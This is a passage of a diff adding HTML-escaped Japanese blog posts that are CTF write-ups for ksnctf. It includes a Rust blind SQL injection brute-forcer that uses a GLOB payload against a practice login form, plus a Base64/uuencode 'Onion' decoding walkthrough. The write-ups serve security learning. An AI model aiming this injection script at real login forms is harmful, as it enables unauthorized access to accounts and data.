class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;t&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;u&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;v&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;E&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;F&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;G&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;H&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;J&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;K&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;M&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;N&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;O&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;R&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;V&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;W&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;9&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;eprintln!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*** 開始 ***&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;' OR pass GLOB 'FLAG_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suffix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suffix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.iter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;format!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}{}{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;reqwest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ctfq.u1tramarine.blue/q6/index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;nf&quot;&gt;.form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;nf&quot;&gt;.send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;.await&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;c&quot;&gt;// println!(&quot;{:#?}&quot;, res);&lt;/span&gt;
+            
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.content_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Some&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}: {:?}{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.content_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;nd&quot;&gt;eprintln!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*** next ***&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;eprintln!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*** 終了 ***&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;Ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(())&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG_*&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG_A*&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG_AA*&lt;/code&gt; のように0文字以上マッチ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;を末尾につけながら、一文字ずつ特定している。&lt;/p&gt;
+
+&lt;p&gt;　丁度良い指標が無かったので、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;content_length&lt;/code&gt; を使った。失敗した時のコンテンツの長さは 500 程度で、成功する 2200 程度だったので、これを元に正しいかどうかを判定した。&lt;/p&gt;
+
+&lt;p&gt;　Rust スキルも徐々に向上していて良い。良い。&lt;/p&gt;
+
+&lt;h3 id=&quot;おしまい&quot;&gt;おしまい&lt;/h3&gt;
+
+&lt;p&gt;　無事にFLAGをゲットできた。おしまい。&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+
+&lt;p&gt;　今回は問題を見た時に謎が分かってしまったため、ささっと出来てしまった。&lt;/p&gt;
+
+&lt;p&gt;　しいて謎となったのは、以下2点である。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;pass をどうやって特定しようかという点&lt;/li&gt;
+  &lt;li&gt;GLOB 句を探し当てるという点&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　LIKE 句で上手くいかなくてそこで &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt; じゃないということに気付いたのだから、なめていたと言われてもしょうがない。&lt;/p&gt;
+
+&lt;p&gt;　とはいえ、謎が分かったとしても実際に攻撃を仕掛けられるかどうかは違うわけで、ちゃんとFLAGを取れたのは良かった。&lt;/p&gt;
+
+&lt;p&gt;　しかし、ブルートフォースで良かったのだろうか。SQL文をあれこれしたら案外SELECT文で取れたりしたのだろうか。まあきっとそれもおいおい分かるに違いない。似た別の問題に出会った時にこの謎は解ける。&lt;/p&gt;
+
+&lt;p&gt;　ではこのへんで。
+　&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 005 Onion</title><link href="/contents/tech/ctf_ksnctf/2021/05/20/005.html" rel="alternate" type="text/html" title="ksnctf 005 Onion" /><published>2021-05-20T12:38:04+00:00</published><updated>2021-05-20T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/20/005</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/20/005.html">&lt;h2 id=&quot;ksnctf-005-onion&quot;&gt;ksnctf 005 Onion&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/26&lt;/li&gt;
+  &lt;li&gt;ジャンル: crypto&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+
+&lt;p&gt;　謎は、問題文である。&lt;/p&gt;
+
+&lt;p&gt;　実は紆余曲折あったのだが、それは所感で記すとしよう。&lt;/p&gt;
+
+&lt;p&gt;　この問題文を見て、何か気づくことがないだろうか。&lt;/p&gt;
+
+&lt;p&gt;　私が気づいたのは以下の2点である。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;[a-z][A-Z][0-9] の62種&lt;/strong&gt;で構成されている&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;一行76文字&lt;/strong&gt;である。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　これらを元に検索してみたところ、この問題文は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; でエンコードされたものであると分かった。&lt;/p&gt;
+
+&lt;p&gt;　早速、 Base64 でデコードしてみる。&lt;/p&gt;
+
+&lt;p&gt;　デコード結果を見てがっかりした人もいるかもしれない。何も変わっていないように見えるからだ。&lt;/p&gt;
+
+&lt;p&gt;　しかし、良く見ると&lt;strong&gt;文字列が短くなっている&lt;/strong&gt;ことが分かる。&lt;/p&gt;
+
+&lt;p&gt;　私はここで、この問題のタイトルが「Onion」であることを思い出し思い至った。&lt;/p&gt;
+
+&lt;p&gt;　&lt;strong&gt;Base64 でエンコードしたテキストをさらに Base64 でエンコードしているのだということに。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;　玉ねぎの皮を剥くように Base64 でデコードし続けていくと、新しい文字列にぶつかった。&lt;/p&gt;
+
+&lt;p&gt;　新しい文字列は非常に特徴的な文字列であり、調べてみると、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uuencode&lt;/code&gt; というエンコーディング方式であることが分かった。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; も &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uuencode&lt;/code&gt; もメールと関連しているエンコーディング方式であり、まず間違いない。&lt;/p&gt;
+
+&lt;p&gt;　新しい文字列を uu で decode すると、FLAG が現れて完了。&lt;/p&gt;
+
+&lt;p&gt;　Base64であることに気づけるかどうかが全ての焦点であった。&lt;/p&gt;
+
+&lt;h3 id=&quot;おまけ&quot;&gt;おまけ&lt;/h3&gt;
+&lt;p&gt;　玉ねぎの皮剥きは結構な量があって手作業だと大変だったので一応プログラムを書いた。&lt;/p&gt;
+
+&lt;p&gt;　今回も Rust を使ってみた。&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;// Base64&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;＜問題文＞&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
